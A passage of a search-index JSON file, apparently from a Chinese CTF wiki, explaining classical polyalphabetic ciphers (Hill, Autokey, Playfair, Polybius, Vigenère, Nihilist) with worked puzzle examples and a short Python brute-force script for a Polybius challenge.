\u5e0c\u5c14\u5bc6\u7801\uff08Hill\uff09\u4f7f\u7528\u6bcf\u4e2a\u5b57\u6bcd\u5728\u5b57\u6bcd\u8868\u4e2d\u7684\u987a\u5e8f\u4f5c\u4e3a\u5176\u5bf9\u5e94\u7684\u6570\u5b57\uff0c\u5373A=0\uff0cB=1\uff0cC=2 \u7b49\uff0c\u7136\u540e\u5c06\u660e\u6587\u8f6c\u5316\u4e3a n \u7ef4\u5411\u91cf\uff0c\u8ddf\u4e00\u4e2a n \u00d7 n \u7684\u77e9\u9635\u76f8\u4e58\uff0c\u518d\u5c06\u5f97\u51fa\u7684\u7ed3\u679c\u6a21 26\u3002\u6ce8\u610f\u7528\u4f5c\u52a0\u5bc6\u7684\u77e9\u9635\uff08\u5373\u5bc6\u5319\uff09\u5728 \\mathbb{Z}_{26}^{n} \\mathbb{Z}_{26}^{n} \u5fc5\u987b\u662f\u53ef\u9006\u7684\uff0c\u5426\u5219\u5c31\u4e0d\u53ef\u80fd\u89e3\u7801\u3002\u53ea\u6709\u77e9\u9635\u7684\u884c\u5217\u5f0f\u548c 26 \u4e92\u8d28\uff0c\u624d\u662f\u53ef\u9006\u7684\u3002\u4e0b\u9762\u4e3e\u4e00\u4e2a\u4f8b\u5b50 \u660e\u6587\uff1aACT \u5c06\u660e\u6587\u5316\u4e3a\u77e9\u9635\u3002 \\begin{bmatrix} 0\\\\ 2\\\\ 19 \\end{bmatrix} \\begin{bmatrix} 0\\\\ 2\\\\ 19 \\end{bmatrix} \u5047\u8bbe\u5bc6\u94a5\u4e3a\uff1a \\begin{bmatrix} 6 & 24 & 1\\\\ 13 & 16 & 10\\\\ 20 & 17 & 15 \\end{bmatrix} \\begin{bmatrix} 6 & 24 & 1\\\\ 13 & 16 & 10\\\\ 20 & 17 & 15 \\end{bmatrix} \u52a0\u5bc6\u8fc7\u7a0b\u4e3a\uff1a \\begin{bmatrix} 6 & 24 & 1\\\\ 13 & 16 & 10\\\\ 20 & 17 & 15 \\end{bmatrix} \\begin{bmatrix} 0\\\\ 2\\\\ 19 \\end{bmatrix} \\equiv \\begin{bmatrix} 67\\\\ 222\\\\ 319 \\end{bmatrix} \\equiv \\begin{bmatrix} 15\\\\ 14\\\\ 7 \\end{bmatrix} \\bmod 26 \\begin{bmatrix} 6 & 24 & 1\\\\ 13 & 16 & 10\\\\ 20 & 17 & 15 \\end{bmatrix} \\begin{bmatrix} 0\\\\ 2\\\\ 19 \\end{bmatrix} \\equiv \\begin{bmatrix} 67\\\\ 222\\\\ 319 \\end{bmatrix} \\equiv \\begin{bmatrix} 15\\\\ 14\\\\ 7 \\end{bmatrix} \\bmod 26 \u5bc6\u6587\u5373\u4e3a \u5bc6\u6587\uff1aPOH \u5de5\u5177 \u00b6 http://www.practicalcryptography.com/ciphers/hill-cipher/ CAP4 Cryptool \u4f8b\u5b50 \u00b6 \u8fd9\u91cc\u6211\u4eec\u4ee5ISCC 2015 base decrypt 150\u4e3a\u4f8b\u8fdb\u884c\u4ecb\u7ecd\uff0c\u9898\u76ee\u4e3a \u5bc6\u6587\uff1a 22,09,00,12,03,01,10,03,04,08,01,17 \uff08wjamdbkdeibr\uff09 \u4f7f\u7528\u7684\u77e9\u9635\u662f 1 2 3 4 5 6 7 8 10 \u8bf7\u5bf9\u5bc6\u6587\u89e3\u5bc6. \u9996\u5148\uff0c\u77e9\u9635\u662f 3 \u00d7 3 \u7684\u3002\u8bf4\u660e\u6bcf\u6b21\u52a0\u5bc63\u4e2a\u5b57\u7b26\u3002\u6211\u4eec\u76f4\u63a5\u4f7f\u7528 Cryptool\uff0c\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u8fd9\u4e2a\u77e9\u9635\u662f\u6309\u7167\u5217\u6765\u6392\u5e03\u7684\u3002\u5373\u5982\u4e0b 1 4 7 2 5 8 3 6 10 \u6700\u540e\u7684\u7ed3\u679c\u4e3a overthehillx \u3002 AutokeyCipher \u00b6 \u539f\u7406 \u00b6 \u81ea\u52a8\u5bc6\u94a5\u5bc6\u7801\uff08Autokey Cipher\uff09\u4e5f\u662f\u591a\u8868\u66ff\u6362\u5bc6\u7801\uff0c\u4e0e\u7ef4\u5409\u5c3c\u4e9a\u5bc6\u7801\u5bc6\u7801\u7c7b\u4f3c\uff0c\u4f46\u4f7f\u7528\u4e0d\u540c\u7684\u65b9\u6cd5\u751f\u6210\u5bc6\u94a5\u3002\u901a\u5e38\u6765\u8bf4\u5b83\u8981\u6bd4\u7ef4\u5409\u5c3c\u4e9a\u5bc6\u7801\u66f4\u5b89\u5168\u3002\u81ea\u52a8\u5bc6\u94a5\u5bc6\u7801\u4e3b\u8981\u6709\u4e24\u79cd\uff0c\u5173\u952e\u8bcd\u81ea\u52a8\u5bc6\u94a5\u5bc6\u7801\u548c\u539f\u6587\u81ea\u52a8\u5bc6\u94a5\u5bc6\u7801\u3002\u4e0b\u9762\u6211\u4eec\u4ee5\u5173\u952e\u8bcd\u81ea\u52a8\u5bc6\u94a5\u4e3a\u4f8b\uff1a \u660e\u6587\uff1aTHE QUICK BROWN FOX JUMPS OVER THE LAZY DOG \u5173\u952e\u8bcd\uff1aCULTURE \u81ea\u52a8\u751f\u6210\u5bc6\u94a5\uff1a CULTURE THE QUICK BROWN FOX JUMPS OVER THE \u63a5\u4e0b\u6765\u7684\u52a0\u5bc6\u8fc7\u7a0b\u548c\u7ef4\u5409\u5c3c\u4e9a\u5bc6\u7801\u7c7b\u4f3c\uff0c\u4ece\u76f8\u5e94\u7684\u8868\u683c\u53ef\u5f97\uff1a \u5bc6\u6587 VBP JOZGD IVEQV HYY AIICX CSNL FWW ZVDP WVK \u5de5\u5177 \u00b6 \u5df2\u77e5\u5173\u952e\u8bcd Python \u7684 pycipher \u5e93 \u672a\u77e5\u5173\u952e\u8bcd http://www.practicalcryptography.com/cryptanalysis/stochastic-searching/cryptanalysis-autokey-cipher/ tools \u6587\u4ef6\u5939\u4e0b break_autokey.py\uff0c\u5f85\u5b8c\u6210\u3002","title":"\u591a\u8868\u4ee3\u6362\u52a0\u5bc6"},{"location":"crypto/classical/polyalphabetic/#_1","text":"\u5bf9\u4e8e\u591a\u8868\u66ff\u6362\u52a0\u5bc6\u6765\u8bf4\uff0c\u52a0\u5bc6\u540e\u7684\u5b57\u6bcd\u51e0\u4e4e\u4e0d\u518d\u4fdd\u6301\u539f\u6765\u7684\u9891\u7387\uff0c\u6240\u4ee5\u6211\u4eec\u4e00\u822c\u53ea\u80fd\u901a\u8fc7\u5bfb\u627e\u7b97\u6cd5\u5b9e\u73b0\u5bf9\u5e94\u7684\u5f31\u70b9\u8fdb\u884c\u7834\u89e3\u3002","title":"\u591a\u8868\u4ee3\u6362\u52a0\u5bc6"},{"location":"crypto/classical/polyalphabetic/#playfair","text":"","title":"Playfair"},{"location":"crypto/classical/polyalphabetic/#_2","text":"Playfair \u5bc6\u7801\uff08Playfair cipher or Playfair square\uff09\u662f\u4e00\u79cd\u66ff\u6362\u5bc6\u7801\uff0c1854 \u5e74\u7531\u82f1\u56fd\u4eba\u67e5\u5c14\u65af\u00b7\u60e0\u65af\u901a\uff08Charles Wheatstone\uff09\u53d1\u660e\uff0c\u57fa\u672c\u7b97\u6cd5\u5982\u4e0b\uff1a \u9009\u53d6\u4e00\u4e32\u82f1\u6587\u5b57\u6bcd\uff0c\u9664\u53bb\u91cd\u590d\u51fa\u73b0\u7684\u5b57\u6bcd\uff0c\u5c06\u5269\u4e0b\u7684\u5b57\u6bcd\u9010\u4e2a\u9010\u4e2a\u52a0\u5165 5 \u00d7 5 \u7684\u77e9\u9635\u5185\uff0c\u5269\u4e0b\u7684\u7a7a\u95f4\u7531\u672a\u52a0\u5165\u7684\u82f1\u6587\u5b57\u6bcd\u4f9d a-z \u7684\u987a\u5e8f\u52a0\u5165\u3002\u6ce8\u610f\uff0c\u5c06 q \u53bb\u9664\uff0c\u6216\u5c06 i \u548c j \u89c6\u4f5c\u540c\u4e00\u5b57\u3002 \u5c06\u8981\u52a0\u5bc6\u7684\u660e\u6587\u5206\u6210\u4e24\u4e2a\u4e00\u7ec4\u3002\u82e5\u7ec4\u5185\u7684\u5b57\u6bcd\u76f8\u540c\uff0c\u5c06 X\uff08\u6216 Q\uff09\u52a0\u5230\u8be5\u7ec4\u7684\u7b2c\u4e00\u4e2a\u5b57\u6bcd\u540e\uff0c\u91cd\u65b0\u5206\u7ec4\u3002\u82e5\u5269\u4e0b\u4e00\u4e2a\u5b57\uff0c\u4e5f\u52a0\u5165 X \u3002 \u5728\u6bcf\u7ec4\u4e2d\uff0c\u627e\u51fa\u4e24\u4e2a\u5b57\u6bcd\u5728\u77e9\u9635\u4e2d\u7684\u5730\u65b9\u3002 \u82e5\u4e24\u4e2a\u5b57\u6bcd\u4e0d\u540c\u884c\u4e5f\u4e0d\u540c\u5217\uff0c\u5728\u77e9\u9635\u4e2d\u627e\u51fa\u53e6\u5916\u4e24\u4e2a\u5b57\u6bcd\uff08\u7b2c\u4e00\u4e2a\u5b57\u6bcd\u5bf9\u5e94\u884c\u4f18\u5148\uff09\uff0c\u4f7f\u8fd9\u56db\u4e2a\u5b57\u6bcd\u6210\u4e3a\u4e00\u4e2a\u957f\u65b9\u5f62\u7684\u56db\u4e2a\u89d2\u3002 \u82e5\u4e24\u4e2a\u5b57\u6bcd\u540c\u884c\uff0c\u53d6\u8fd9\u4e24\u4e2a\u5b57\u6bcd\u53f3\u65b9\u7684\u5b57\u6bcd\uff08\u82e5\u5b57\u6bcd\u5728\u6700\u53f3\u65b9\u5219\u53d6\u6700\u5de6\u65b9\u7684\u5b57\u6bcd\uff09\u3002 \u82e5\u4e24\u4e2a\u5b57\u6bcd\u540c\u5217\uff0c\u53d6\u8fd9\u4e24\u4e2a\u5b57\u6bcd\u4e0b\u65b9\u7684\u5b57\u6bcd\uff08\u82e5\u5b57\u6bcd\u5728\u6700\u4e0b\u65b9\u5219\u53d6\u6700\u4e0a\u65b9\u7684\u5b57\u6bcd\uff09\u3002 \u65b0\u627e\u5230\u7684\u4e24\u4e2a\u5b57\u6bcd\u5c31\u662f\u539f\u672c\u7684\u4e24\u4e2a\u5b57\u6bcd\u52a0\u5bc6\u7684\u7ed3\u679c\u3002 \u4ee5 playfair example \u4e3a\u5bc6\u5319\uff0c\u5f97 P L A Y F I R E X M B C D G H K N O Q S T U V W Z \u8981\u52a0\u5bc6\u7684\u8baf\u606f\u4e3a Hide the gold in the tree stump HI DE TH EG OL DI NT HE TR EX ES TU MP \u5c31\u4f1a\u5f97\u5230 BM OD ZB XD NA BE KU DM UI XM MO UV IF","title":"\u539f\u7406"},{"location":"crypto/classical/polyalphabetic/#_3","text":"CAP4","title":"\u5de5\u5177"},{"location":"crypto/classical/polyalphabetic/#polybius","text":"","title":"Polybius"},{"location":"crypto/classical/polyalphabetic/#_4","text":"Polybius\u5bc6\u7801\u53c8\u79f0\u4e3a\u68cb\u76d8\u5bc6\u7801\uff0c\u5176\u4e00\u822c\u662f\u5c06\u7ed9\u5b9a\u7684\u660e\u6587\u52a0\u5bc6\u4e3a\u4e24\u4e24\u7ec4\u5408\u7684\u6570\u5b57\uff0c\u5176\u5e38\u7528\u5bc6\u7801\u8868 1 2 3 4 5 1 A B C D E 2 F G H I/J K 3 L M N O P 4 Q R S T U 5 V W X Y Z \u4e3e\u4e2a\u4f8b\u5b50\uff0c\u660e\u6587 HELLO\uff0c\u52a0\u5bc6\u540e\u5c31\u662f 23 15 31 31 34\u3002 \u53e6\u4e00\u79cd\u5bc6\u7801\u8868 A D F G X A b t a l p D d h o z k F q f v s n G g j c u x X m r e w y \u6ce8\u610f\uff0c\u8fd9\u91cc\u5b57\u6bcd\u7684\u987a\u5e8f\u88ab\u6253\u4e71\u4e86\u3002 A D F G X \u7684\u7531\u6765\uff1a 1918 \u5e74\uff0c\u7b2c\u4e00\u6b21\u4e16\u754c\u5927\u6218\u5c06\u8981\u7ed3\u675f\u65f6\uff0c\u6cd5\u519b\u622a\u83b7\u4e86\u4e00\u4efd\u5fb7\u519b\u7535\u62a5\uff0c\u7535\u6587\u4e2d\u7684\u6240\u6709\u5355\u8bcd\u90fd\u7531 A\u3001D\u3001F\u3001G\u3001X \u4e94\u4e2a\u5b57\u6bcd\u62fc\u6210\uff0c\u56e0\u6b64\u88ab\u79f0\u4e3a ADFGX \u5bc6\u7801\u3002ADFGX \u5bc6\u7801\u662f 1918 \u5e74 3 \u6708\u7531\u5fb7\u519b\u4e0a\u6821 Fritz Nebel \u53d1\u660e\u7684\uff0c\u662f\u7ed3\u5408\u4e86 Polybius \u5bc6\u7801\u548c\u7f6e\u6362\u5bc6\u7801\u7684\u53cc\u91cd\u52a0\u5bc6\u65b9\u6848\u3002 \u4e3e\u4e2a\u4f8b\u5b50\uff0cHELLO\uff0c\u4f7f\u7528\u8fd9\u4e2a\u8868\u683c\u52a0\u5bc6\uff0c\u5c31\u662f DD XF AG AG DF\u3002","title":"\u539f\u7406"},{"location":"crypto/classical/polyalphabetic/#_5","text":"CrypTool","title":"\u5de5\u5177"},{"location":"crypto/classical/polyalphabetic/#_6","text":"\u8fd9\u91cc\u4ee5\u5b89\u6052\u676f 9 \u6708 Crypto \u8d5b\u9898 Go \u4e3a\u4f8b\uff0c\u9898\u76ee\u4e3a\uff1a \u5bc6\u6587\uff1ailnllliiikkninlekile \u538b\u7f29\u5305\u7ed9\u4e86\u4e00\u884c\u5341\u516d\u8fdb\u5236\uff1a546865206c656e677468206f66207468697320706c61696e746578743a203130 \u8bf7\u5bf9\u5bc6\u6587\u89e3\u5bc6 \u9996\u5148\u5bf9\u5341\u516d\u8fdb\u5236\u8fdb\u884c hex \u89e3\u7801\uff0c\u5f97\u5230\u5b57\u7b26\u4e32\uff1a\"The length of this plaintext: 10\" \u5bc6\u6587\u957f\u5ea6\u4e3a 20 \uff0c\u800c\u660e\u6587\u957f\u5ea6\u4e3a 10 \uff0c\u5bc6\u6587\u53ea\u6709 \" l \",\" i \",\" n \",\" k \",\" e \" \u8fd9\u4e94\u4e2a\u5b57\u7b26\uff0c\u8054\u60f3\u5230\u68cb\u76d8\u5bc6\u7801\u3002 \u9996\u5148\u8bd5\u4e00\u4e0b\u4e94\u4e2a\u5b57\u7b26\u6309\u5b57\u6bcd\u8868\u987a\u5e8f\u6392\u5217\uff1a e i k l n e A B C D E i F G H I/J K k L M N O P l Q R S T U n V W X Y Z \u6839\u636e\u5bc6\u6587\u89e3\u5bc6\u5f97\uff1aiytghpkqmq\u3002 \u8fd9\u5e94\u8be5\u4e0d\u662f\u6211\u4eec\u60f3\u8981\u7684 flag \u7b54\u6848\u3002 \u770b\u6765\u8fd9\u4e94\u4e2a\u5b57\u7b26\u6392\u5217\u4e0d\u662f\u8fd9\u4e48\u6392\u5217\u7684\uff0c\u4e00\u5171\u6709 5! \u79cd\u60c5\u51b5\uff0c\u5199\u811a\u672c\u7206\u7834\uff1a import itertools key = [] cipher = \"ilnllliiikkninlekile\" for i in itertools . permutations ( 'ilnke' , 5 ): key . append ( '' . join ( i )) for now_key in key : solve_c = \"\" res = \"\" for now_c in cipher : solve_c += str ( now_key . index ( now_c )) for i in range ( 0 , len ( solve_c ), 2 ): now_ascii = int ( solve_c [ i ]) * 5 + int ( solve_c [ i + 1 ]) + 97 if now_ascii > ord ( 'i' ): now_ascii += 1 res += chr ( now_ascii ) if \"flag\" in res : print now_key , res \u811a\u672c\u5176\u5b9e\u5c31\u662f\u5b9e\u73b0\u68cb\u76d8\u5bc6\u7801\u8fd9\u4e2a\u7b97\u6cd5\uff0c\u53ea\u662f\u8fd9\u4e94\u4e2a\u5b57\u7b26\u7684\u987a\u5e8f\u4e0d\u5b9a\u3002 \u8dd1\u51fa\u4e0b\u9762\u4e24\u4e2a\u7ed3\u679c\uff1a linke flagishere linek flagkxhdwd \u663e\u7136\u7b2c\u4e00\u4e2a\u662f\u6211\u4eec\u60f3\u8981\u7684\u7b54\u6848\u3002 \u9644\u4e0a\u6b63\u786e\u7684\u5bc6\u7801\u8868\uff1a l i n k e l A B C D E i F G H I/J K n L M N O P k Q R S T U e V W X Y Z","title":"\u4f8b\u5b50"},{"location":"crypto/classical/polyalphabetic/#vigenere","text":"","title":"Vigenere \u7ef4\u5409\u5c3c\u4e9a\u5bc6\u7801"},{"location":"crypto/classical/polyalphabetic/#_7","text":"\u7ef4\u5409\u5c3c\u4e9a\u5bc6\u7801\uff08Vigenere\uff09\u662f\u4f7f\u7528\u4e00\u7cfb\u5217\u51ef\u6492\u5bc6\u7801\u7ec4\u6210\u5bc6\u7801\u5b57\u6bcd\u8868\u7684\u52a0\u5bc6\u7b97\u6cd5\uff0c\u5c5e\u4e8e\u591a\u8868\u5bc6\u7801\u7684\u4e00\u79cd\u7b80\u5355\u5f62\u5f0f\u3002 \u4e0b\u9762\u7ed9\u51fa\u4e00\u4e2a\u4f8b\u5b50 \u660e\u6587\uff1acome greatwall \u5bc6\u94a5\uff1acrypto \u9996\u5148\uff0c\u5bf9\u5bc6\u94a5\u8fdb\u884c\u586b\u5145\u4f7f\u5176\u957f\u5ea6\u4e0e\u660e\u6587\u957f\u5ea6\u4e00\u6837\u3002 \u660e\u6587 c o m e g r e a t w a l l \u5bc6\u94a5 c r y p t o c r y p t o c \u5176\u6b21\uff0c\u67e5\u8868\u5f97\u5bc6\u6587 \u660e\u6587\uff1acome greatwall \u5bc6\u94a5\uff1acrypto \u5bc6\u6587\uff1aefkt zferrltzn","title":"\u539f\u7406"},{"location":"crypto/classical/polyalphabetic/#_8","text":"\u5bf9\u5305\u62ec\u7ef4\u5409\u5c3c\u4e9a\u5bc6\u7801\u5728\u5185\u7684\u6240\u6709\u591a\u8868\u5bc6\u7801\u7684\u7834\u8bd1\u90fd\u662f\u4ee5\u5b57\u6bcd\u9891\u7387\u4e3a\u57fa\u7840\u7684\uff0c\u4f46\u76f4\u63a5\u7684\u9891\u7387\u5206\u6790\u5374\u5e76\u4e0d\u9002\u7528\uff0c\u8fd9\u662f\u56e0\u4e3a\u5728\u7ef4\u5409\u5c3c\u4e9a\u5bc6\u7801\u4e2d\uff0c\u4e00\u4e2a\u5b57\u6bcd\u53ef\u4ee5\u88ab\u52a0\u5bc6\u6210\u4e0d\u540c\u7684\u5bc6\u6587\uff0c\u56e0\u800c\u7b80\u5355\u7684\u9891\u7387\u5206\u6790\u5728\u8fd9\u91cc\u5e76\u6ca1\u6709\u7528\u3002 \u7834\u8bd1\u7ef4\u5409\u5c3c\u4e9a\u5bc6\u7801\u7684\u5173\u952e\u5728\u4e8e\u5b83\u7684\u5bc6\u94a5\u662f\u5faa\u73af\u91cd\u590d\u7684\u3002 \u5982\u679c\u6211\u4eec\u77e5\u9053\u4e86\u5bc6\u94a5\u7684\u957f\u5ea6\uff0c\u90a3\u5bc6\u6587\u5c31\u53ef\u4ee5\u88ab\u770b\u4f5c\u662f\u4ea4\u7ec7\u5728\u4e00\u8d77\u7684\u51ef\u6492\u5bc6\u7801\uff0c\u800c\u5176\u4e2d\u6bcf\u4e00\u4e2a\u90fd\u53ef\u4ee5\u5355\u72ec\u7834\u89e3\u3002\u5173\u4e8e\u5bc6\u7801\u7684\u957f\u5ea6\uff0c\u6211\u4eec\u53ef\u4ee5 \u4f7f\u7528\u5361\u897f\u65af\u57fa\u8bd5\u9a8c\u548c\u5f17\u91cc\u5fb7\u66fc\u8bd5\u9a8c\u6765\u83b7\u53d6\u3002 \u5361\u897f\u65af\u57fa\u8bd5\u9a8c\u662f\u57fa\u4e8e\u7c7b\u4f3c the \u8fd9\u6837\u7684\u5e38\u7528\u5355\u8bcd\u6709\u53ef\u80fd\u88ab\u540c\u6837\u7684\u5bc6\u94a5\u5b57\u6bcd\u8fdb\u884c\u52a0\u5bc6\uff0c\u4ece\u800c\u5728\u5bc6\u6587\u4e2d\u91cd\u590d\u51fa\u73b0\u3002\u4f8b\u5982\uff0c\u660e\u6587\u4e2d\u4e0d\u540c\u7684 CRYPTO \u53ef\u80fd\u88ab\u5bc6\u94a5 ABCDEF \u52a0\u5bc6\u6210\u4e0d\u540c\u7684\u5bc6\u6587\uff1a \u5bc6\u94a5\uff1aABCDEF AB CDEFA BCD EFABCDEFABCD \u660e\u6587\uff1aCRYPTO IS SHORT FOR CRYPTOGRAPHY \u5bc6\u6587\uff1aCSASXT IT UKSWT GQU GWYQVRKWAQJB \u6b64\u65f6\u660e\u6587\u4e2d\u91cd\u590d\u7684\u5143\u7d20\u5728\u5bc6\u6587\u4e2d\u5e76\u4e0d\u91cd\u590d\u3002\u7136\u800c\uff0c\u5982\u679c\u5bc6\u94a5\u76f8\u540c\u7684\u8bdd\uff0c\u7ed3\u679c\u53ef\u80fd\u4fbf\u4e3a\uff08\u4f7f\u7528\u5bc6\u94a5 ABCD\uff09\uff1a \u5bc6\u94a5\uff1aABCDAB CD ABCDA BCD ABCDABCDABCD \u660e\u6587\uff1aCRYPTO IS SHORT FOR CRYPTOGRAPHY \u5bc6\u6587\uff1aCSASTP KV SIQUT GQU CSASTPIUAQJB \u6b64\u65f6\u5361\u897f\u65af\u57fa\u8bd5\u9a8c\u5c31\u80fd\u4ea7\u751f\u6548\u679c\u3002\u5bf9\u4e8e\u66f4\u957f\u7684\u6bb5\u843d\u6b64\u65b9\u6cd5\u66f4\u4e3a\u6709\u6548\uff0c\u56e0\u4e3a\u901a\u5e38\u5bc6\u6587\u4e2d\u91cd\u590d\u7684\u7247\u6bb5\u4f1a\u66f4\u591a\u3002\u5982\u901a\u8fc7\u4e0b\u9762\u7684\u5bc6\u6587\u5c31\u80fd\u7834\u8bd1\u51fa\u5bc6\u94a5\u7684\u957f\u5ea6\uff1a \u5bc6\u6587\uff1aDYDUXRMHTVDVNQDQNWDYDUXRMHARTJGWNQD \u5176\u4e2d\uff0c\u4e24\u4e2a DYDUXRMH \u7684\u51fa\u73b0\u76f8\u9694\u4e86 18 \u4e2a\u5b57\u6bcd\u3002\u56e0\u6b64\uff0c\u53ef\u4ee5\u5047\u5b9a\u5bc6\u94a5\u7684\u957f\u5ea6\u662f 18 \u7684\u7ea6\u6570\uff0c\u5373\u957f\u5ea6\u4e3a 18\u30019\u30016\u30013 \u6216 2\u3002\u800c\u4e24\u4e2a NQD \u5219\u76f8\u8ddd 20 \u4e2a\u5b57\u6bcd\uff0c\u610f\u5473\u7740\u5bc6\u94a5\u957f\u5ea6\u5e94\u4e3a 20\u300110\u30015\u30014 \u6216 2\u3002\u53d6\u4e24\u8005\u7684\u4ea4\u96c6\uff0c\u5219\u53ef\u4ee5\u57fa\u672c\u786e\u5b9a\u5bc6\u94a5\u957f\u5ea6\u4e3a 2\u3002\u63a5\u4e0b\u6765\u5c31\u662f\u8fdb\u884c\u8fdb\u4e00\u6b65\u7684\u64cd\u4f5c\u4e86\u3002 \u5173\u4e8e\u66f4\u52a0\u8be6\u7ec6\u7684\u7834\u89e3\u539f\u7406\uff0c\u8fd9\u91cc\u6682\u65f6\u4e0d\u505a\u8fc7\u591a\u7684\u4ecb\u7ecd\u3002\u53ef\u4ee5\u53c2\u8003http:// www.practicalcryptography.com/cryptanalysis/stochastic-searching/cryptanalysis-vigenere-cipher/ \u3002","title":"\u7834\u89e3"},{"location":"crypto/classical/polyalphabetic/#_9","text":"\u5df2\u77e5\u5bc6\u94a5 Python \u7684 pycipher \u5e93 \u5728\u7ebf\u89e3\u5bc6 Vigen\u00e8re cipher CAP4 \u672a\u77e5\u5bc6\u94a5 Vigen\u00e8re Cipher Codebreaker Vigenere Solver \uff0c\u4e0d\u591f\u5b8c\u5584\u3002","title":"\u5de5\u5177"},{"location":"crypto/classical/polyalphabetic/#nihilist","text":"","title":"Nihilist"},{"location":"crypto/classical/polyalphabetic/#_10","text":"Nihilist\u5bc6\u7801\u53c8\u79f0\u5173\u952e\u5b57\u5bc6\u7801\uff1a\u660e\u6587 + \u5173\u952e\u5b57 = \u5bc6\u6587\u3002\u4ee5\u5173\u952e\u5b57 helloworld \u4e3a\u4f8b\u3002 \u9996\u5148\u5229\u7528\u5bc6\u94a5\u6784\u9020\u68cb\u76d8\u77e9\u9635\uff08\u7c7b\u4f3c Polybius \u5bc6\u7801\uff09 - \u65b0\u5efa\u4e00\u4e2a 5 \u00d7 5 \u77e9\u9635 - \u5c06\u5b57\u7b26\u4e0d\u91cd\u590d\u5730\u4f9d\u6b21\u586b\u5165\u77e9\u9635 - \u5269\u4e0b\u90e8\u5206\u6309\u5b57\u6bcd\u987a\u5e8f\u586b\u5165 - \u5b57\u6bcd i \u548c j \u7b49\u4ef7 1 2 3 4 5 1 h e l o w 2 r d a b c 3 f g i / j k m 4 n p q s t 5 u v x y z \u5bf9\u4e8e\u52a0\u5bc6\u8fc7\u7a0b\u53c2\u7167\u77e9\u9635 M \u8fdb\u884c\u52a0\u5bc6\uff1a a -> M[2,3] -> 23 t -> M[4,5] -> 45 \u5bf9\u4e8e\u89e3\u5bc6\u8fc7\u7a0b \u53c2\u7167\u77e9\u9635 M \u8fdb\u884c\u89e3\u5bc6\uff1a 23 -> M[2,3] -> a 45 -> M[4,5] -> t \u53ef\u4ee5\u770b\u51fa\uff0c\u5bc6\u6587\u7684\u7279\u5f81\u6709\u5982\u4e0b\u51e0\u70b9 \u7eaf\u6570\u5b57 \u53ea\u5305\u542b 1 \u5230 5 \u5bc6\u6587\u957f\u5ea6\u5076\u6570\u3002","title":"\u539f\u7406"},{"location":"crypto/classical/polyalphabetic/#hill","text":"","title":"Hill"},{"location":"crypto/classical/polyalphabetic/#_11","text":"\u5e0c\u5c14\u5bc6\u7801\uff08Hill\uff09\u4f7f\u7528\u6bcf\u4e2a\u5b57\u6bcd\u5728\u5b57\u6bcd\u8868\u4e2d\u7684\u987a\u5e8f\u4f5c\u4e3a\u5176\u5bf9\u5e94\u7684\u6570\u5b57\uff0c\u5373A=0\uff0cB=1\uff0cC=2 \u7b49\uff0c\u7136\u540e\u5c06\u660e\u6587\u8f6c\u5316\u4e3a n \u7ef4\u5411\u91cf\uff0c\u8ddf\u4e00\u4e2a n \u00d7 n \u7684\u77e9\u9635\u76f8\u4e58\uff0c\u518d\u5c06\u5f97\u51fa\u7684\u7ed3\u679c\u6a21 26\u3002\u6ce8\u610f\u7528\u4f5c\u52a0\u5bc6\u7684\u77e9\u9635\uff08\u5373\u5bc6\u5319\uff09\u5728 \\mathbb{Z}_{26}^{n} \\mathbb{Z}_{26}^{n} \u5fc5\u987b\u662f\u53ef\u9006\u7684\uff0c\u5426\u5219\u5c31\u4e0d\u53ef\u80fd\u89e3\u7801\u3002\u53ea\u6709\u77e9\u9635\u7684\u884c\u5217\u5f0f\u548c 26 \u4e92\u8d28\uff0c\u624d\u662f\u53ef\u9006\u7684\u3002\u4e0b\u9762\u4e3e\u4e00\u4e2a\u4f8b\u5b50 \u660e\u6587\uff1aACT \u5c06\u660e\u6587\u5316\u4e3a\u77e9\u9635\u3002 \\begin{bmatrix} 0\\\\ 2\\\\ 19 \\end{bmatrix} \\begin{bmatrix} 0\\\\ 2\\\\ 19 \\end{bmatrix} \u5047\u8bbe\u5bc6\u94a5\u4e3a\uff1a \\begin{bmatrix} 6 & 24 & 1\\\\ 13 & 16 & 10\\\\ 20 & 17 & 15 \\end{bmatrix} \\begin{bmatrix} 6 & 24 & 1\\\\ 13 & 16 & 10\\\\ 20 & 17 & 15 \\end{bmatrix} \u52a0\u5bc6\u8fc7\u7a0b\u4e3a\uff1a \\begin{bmatrix} 6 & 24 & 1\\\\ 13 & 16 & 10\\\\ 20 & 17 & 15 \\end{bmatrix} \\begin{bmatrix} 0\\\\ 2\\\\ 19 \\end{bmatrix} \\equiv \\begin{bmatrix} 67\\\\ 222\\\\ 319 \\end{bmatrix} \\equiv \\begin{bmatrix} 15\\\\ 14\\\\ 7 \\end{bmatrix} \\bmod 26 \\begin{bmatrix} 6 & 24 & 1\\\\ 13 & 16 & 10\\\\ 20 & 17 & 15 \\end{bmatrix} \\begin{bmatrix} 0\\\\ 2\\\\ 19 \\end{bmatrix} \\equiv \\begin{bmatrix} 67\\\\ 222\\\\ 319 \\end{bmatrix} \\equiv \\begin{bmatrix} 15\\\\ 14\\\\ 7 \\end{bmatrix} \\bmod 26 \u5bc6\u6587\u5373\u4e3a \u5bc6\u6587\uff1aPOH","title":"\u539f\u7406"},{"location":"crypto/classical/polyalphabetic/#_12","text":"http://www.practicalcryptography.com/ciphers/hill-cipher/ CAP4 Cryptool","title":"\u5de5\u5177"},{"location":"crypto/classical/polyalphabetic/#_13","text":"\u8fd9\u91cc\u6211\u4eec\u4ee5ISCC 2015 base decrypt 150\u4e3a\u4f8b\u8fdb\u884c\u4ecb\u7ecd\uff0c\u9898\u76ee\u4e3a \u5bc6\u6587\uff1a 22,09,00,12,03,01,10,03,04,08,01,17 \uff08wjamdbkdeibr\uff09 \u4f7f\u7528\u7684\u77e9\u9635\u662f 1 2 3 4 5 6 7 8 10 \u8bf7\u5bf9\u5bc6\u6587\u89e3\u5bc6. \u9996\u5148\uff0c\u77e9\u9635\u662f 3 \u00d7 3 \u7684\u3002\u8bf4\u660e\u6bcf\u6b21\u52a0\u5bc63\u4e2a\u5b57\u7b26\u3002\u6211\u4eec\u76f4\u63a5\u4f7f\u7528 Cryptool\uff0c\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u8fd9\u4e2a\u77e9\u9635\u662f\u6309\u7167\u5217\u6765\u6392\u5e03\u7684\u3002\u5373\u5982\u4e0b 1 4 7 2 5 8 3 6 10 \u6700\u540e\u7684\u7ed3\u679c\u4e3a overthehillx 